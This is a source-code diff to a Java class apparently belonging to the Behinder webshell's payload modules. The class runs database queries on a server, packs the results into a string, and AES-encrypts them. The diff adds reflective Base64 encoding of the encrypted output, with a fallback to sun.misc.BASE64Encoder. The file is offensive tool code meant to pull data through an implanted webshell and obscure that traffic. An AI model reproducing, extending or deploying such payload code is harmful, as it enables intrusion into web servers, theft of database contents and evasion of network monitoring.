@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Method;
 import java.sql.Connection;
 import java.sql.DriverManager;
@@ -10,6 +11,7 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.Random;
 import javax.crypto.Cipher;
@@ -136,7 +138,7 @@ public class Database {
          result = result + "],";
          Map record = new LinkedHashMap();
 
-         for(ArrayList recordList = new ArrayList(); rs.next(); result = result + "],") {
+         for(List recordList = new ArrayList(); rs.next(); result = result + "],") {
             result = result + "[";
             String[] var20 = colNames;
             int var21 = colNames.length;
@@ -170,7 +172,9 @@ public class Database {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      return this.base64encode(bos.toByteArray()).getBytes();
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -225,6 +229,27 @@ public class Database {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private String base64encode(byte[] data) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+
+      Class Base64;
+      try {
+         this.getClass();
+         Base64 = Class.forName("java.util.Base64");
+         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
+      } catch (Throwable var7) {
+         this.getClass();
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Object Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
    }
 
    private byte[] getMagic() throws Exception {
